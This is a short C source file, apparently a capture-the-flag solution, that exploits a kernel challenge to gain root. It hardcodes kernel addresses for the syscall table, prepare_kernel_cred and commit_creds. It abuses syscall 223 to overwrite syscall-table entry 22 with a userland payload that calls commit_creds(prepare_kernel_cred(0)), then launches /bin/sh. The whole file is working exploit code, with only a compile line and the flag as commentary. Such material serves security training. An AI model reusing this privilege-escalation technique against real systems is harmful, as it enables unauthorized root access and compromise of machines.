/* compile with: gcc -std=c99 -T ./linker.ld exp.c
 * flag: Congratz!! addr_limit looks quite IMPORTANT now... huh?
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define SYS_CALL_TABLE          0x8000e348
#define NR_SYS_UNUSED               223
#define PREPARE_KERNEL_CREDS    0x8003f924
#define COMMIT_CREDS            0x8003f56c

void * (* prepare_kernel_cred )( void *) = (void*) PREPARE_KERNEL_CREDS;
void (* commit_creds )( void *) = (void*) COMMIT_CREDS;
unsigned int** sct = (unsigned int**)SYS_CALL_TABLE;

void launch_shell ( void ) {
    system("/bin/sh");
}

long payload(void)
{
    commit_creds(prepare_kernel_cred (0));
    return 0;
}

void print_syscall_tbl()
{
    char buf[400] = {0};
    syscall(NR_SYS_UNUSED, &sct[22], buf);
    for (int i = 0; i < 280; i+=4)
    {
        printf("%d, %02x%02x%02x%02x\n", i, buf[i+3], buf[i+2], buf[i+1], buf[i]);
    }
}

int
main()
{
    void* addr = &payload;
    syscall(NR_SYS_UNUSED, &addr, &sct[22]);
    syscall(22);
    launch_shell();

    return 0;
}

